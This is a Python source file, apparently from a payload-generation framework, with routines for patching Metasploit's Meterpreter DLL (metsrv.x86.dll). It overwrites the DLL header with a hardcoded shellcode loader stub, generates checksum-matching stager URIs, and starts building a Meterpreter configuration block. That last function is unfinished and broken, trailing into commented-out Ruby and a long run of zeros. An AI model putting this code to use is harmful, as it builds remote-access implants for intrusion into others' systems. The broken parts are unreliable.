"""

Methods used for binary/MSF .dll patching.

"""

import helpers, settings, os, sys, subprocess, struct, string, random, time


# patch the headers or 
# def selfcontained_patch():
def headerPatch():

    try:
        metsrvPath = (subprocess.check_output("find " + settings.METASPLOIT_PATH + " -name 'metsrv.x86.dll'", shell=True)).strip()
    except:
        print "[*] Error: You either do not have the latest version of Metasploit or"
        print "[*] Error: do not have your METASPLOIT_PATH set correctly in your settings file."
        print "[*] Error: Please fix either issue then select this payload again!"
        sys.exit()

    with open(metsrvPath, 'rb') as f:
        metDLL = f.read()

    dllheaderPatch =  "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\x39"
    dllheaderPatch += "\x12\x00\x00\xff\xd3\x81\xc3\xc0\x67\x0d\x00\x89\x3b\x53\x6a\x04"
    dllheaderPatch += "\x50\xff\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    return dllReplace(metDLL, 0, dllheaderPatch)


# short function used for patching the metsvc.dll
def dllReplace(dll, ind, s):
    return dll[:ind] + s + dll[ind+len(s):]


#Taken from Veil-Ordnance Codebase
def gen_uri():
    goal_sum = 92
    all_characters = list(string.digits + string.ascii_letters)
    while True:
        uri = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(3))
        for character in all_characters:
            full_uri = uri + character
            string_sum = checksum_eight(full_uri)
            if string_sum == goal_sum:
                return full_uri

def checksum_eight(string_checked):
    current_sum = 0
    num_Bs = len(string_checked)
    letter_values = struct.unpack("B" * num_Bs, string_checked)
    for value in letter_values:
        current_sum += value
    return current_sum % 0x100


# Based off of https://github.com/rapid7/metasploit-framework/blob/e749733eb6118a4b089e288fc81050f76c8db5ed/lib/rex/payloads/meterpreter/config.rb
def config_block():
    puid = helpers.randomString(length=8)
    plat_xor = random.randint(1, 256)
    arch_xor = random.randint(1, 256)
    time_xor = random.randint(718023372, 3988975042)
    tstamp = int(str(time.time()).split('.')[0])

    end_uuid = puid + [plat_xor, arch_xor, plat_xor ^ plat_id, arch_xor ^ arch_id, time_xor ^ tstamp].pack('BBBBI')


#uuid = def to_h
#    {
#        puid: self.puid,
#        arch: self.arch, platform: self.platform,
#        timestamp: self.timestamp,
#        xor1: self.xor1, xor2: self.xor2
#    }

#def self.generate_raw(opts={})
#    plat_id = find_platform_id(opts[:platform]) || 0
#    arch_id = find_architecture_id(opts[:arch]) || 0
#    tstamp  = opts[:timestamp] || Time.now.utc.to_i
#    puid    = opts[:puid]

#    if opts[:seed]
#      puid = seed_to_puid(opts[:seed])
#    end

 #   puid ||= Rex::Text.rand_text(8)

#    if puid.length != 8
#      raise ArgumentError, "The :puid parameter must be exactly 8 bytes"
#    end

#    plat_xor = opts[:xor1] || rand(256)
#    arch_xor = opts[:xor2] || rand(256)

    # Recycle the previous two XOR bytes to keep our output small
 #   time_xor = [plat_xor, arch_xor, plat_xor, arch_xor].pack('C4').unpack('N').first
 ########**********************************aka random number between 718023372 and 3988975042

    # Combine the payload UID with the arch/platform and use xor to
    # obscure the platform, architecture, and timestamp
  #  puid +
  #    [
  #      plat_xor, arch_xor,
  #      plat_xor ^ plat_id,
  #      arch_xor ^ arch_id,
  #      time_xor ^ tstamp
  #    ].pack('C4N')
  #end

#Session Block info UUID seems to equal 16 random hex characters (UID)/x86=1/windows=1/YYYY-MM-DDZ
# Session data = 0 (comms stager patched in), 1453503984 (value for exit func process), 604800 (timeout), uuid. - this list is packed pack('VVVA*')
# Then the transport block (just the http comms) followed by - 
#0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c010000100e00000a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
# Then add two null bytes << "\x00\x00"

